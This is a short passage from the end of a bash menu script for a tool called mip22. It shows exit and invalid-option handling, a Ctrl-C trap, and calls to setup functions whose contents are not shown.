			echo -e "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using mip22"
			sleep 2
			clear
			exit 1
			;;
		*)
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			sleep 0.7
			menu
			;;
	esac	
}

control_c() {
	echo -e "${RESETBG}"
	echo -e "${RESETFG}"
	clear
	exit 1
}

trap control_c SIGINT

check_os_and_install_packages
check_root_and_os
pid_kill
menu
